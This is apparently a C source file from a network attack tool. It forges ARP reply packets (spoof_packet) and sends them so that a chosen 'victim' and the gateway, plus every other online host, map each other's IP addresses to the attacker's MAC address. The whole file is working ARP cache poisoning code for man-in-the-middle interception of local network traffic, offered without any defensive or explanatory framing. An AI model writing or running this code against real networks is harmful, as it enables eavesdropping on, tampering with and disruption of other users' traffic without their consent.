#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <stdbool.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>

#include "spoof.h"
#include "nodes.h"
#include "debug.h"

struct arp_ip4 {
    uint8_t  ar_sha[ETH_ALEN];  /* Sender hardware address.     */
    uint32_t ar_sip;            /* Sender IP address.           */
    uint8_t ar_tha[ETH_ALEN];   /* Target hardware address.     */
    uint32_t  ar_tip;           /* Target IP address.           */
 } __attribute__((packed));

#define ARPREPLY_SIZE (sizeof(struct ether_header) + sizeof(struct arphdr) + sizeof(struct arp_ip4))

void spoof_packet(uint8_t *buffer, uint32_t from_ip4, uint8_t from_hw[ETH_ALEN], uint32_t to_ip4, uint8_t to_hw[ETH_ALEN]) {
	assert(buffer);

	struct ether_header *ethernet;
 	struct arphdr *header;
 	struct arp_ip4 *data;

 	ethernet = (struct ether_header *)buffer;
 	header = (struct arphdr *)(buffer + sizeof(struct ether_header));
 	data = (struct arp_ip4 *)(buffer + sizeof(struct ether_header) + sizeof(struct arphdr));

	memcpy(ethernet->ether_dhost, to_hw, ETH_ALEN);
	memcpy(ethernet->ether_shost, from_hw, ETH_ALEN);
	ethernet->ether_type = htons(ETH_P_ARP);

	header->ar_hrd = htons(ARPHRD_ETHER);
	header->ar_pro = htons(ETH_P_IP);
	header->ar_hln = ETH_ALEN;
	header->ar_pln = 4;
	header->ar_op  = htons(ARPOP_REPLY);

	memcpy(data->ar_sha, from_hw, ETH_ALEN);
	data->ar_sip = from_ip4;
	memcpy(data->ar_tha, to_hw, ETH_ALEN);
	data->ar_tip = to_ip4;

}

void Spoof_node(int packet_sock, uint8_t buffer[ARPREPLY_SIZE], struct Node *victim, struct CurrentAddress *current) {

	struct Node *nodes = nodes_get();
	int node_count = nodes_count();
	uint8_t *gw_hw = node_get(current->gateway)->hwaddr;

	spoof_packet(buffer, victim->ip4addr, current->hwaddr, current->gateway, gw_hw);
	send(packet_sock, buffer, ARPREPLY_SIZE, 0);

	for (int i = 0; i < node_count; i++) {
		if (nodes[i].is_online && nodes[i].ip4addr != victim->ip4addr) {
			spoof_packet(buffer, nodes[i].ip4addr, current->hwaddr, victim->ip4addr, victim->hwaddr);
			send(packet_sock, buffer, ARPREPLY_SIZE, 0);
		}
	}

}

void Spoof_nodes(int packet_sock, struct CurrentAddress *current) {
	ArrayList owned = nodes_get_owned();
	int owned_count = ArrayList_length(owned);

	if (owned_count == 0) {
		DWARNING("%s\n", "Nothing to spoof");
		return;
	}


	uint8_t buffer[ARPREPLY_SIZE];
	for (int i = 0; i < owned_count; i++) {
		Spoof_node(packet_sock, buffer, ARRAYLIST_GET(owned, struct Node*, i), current);
	}

}

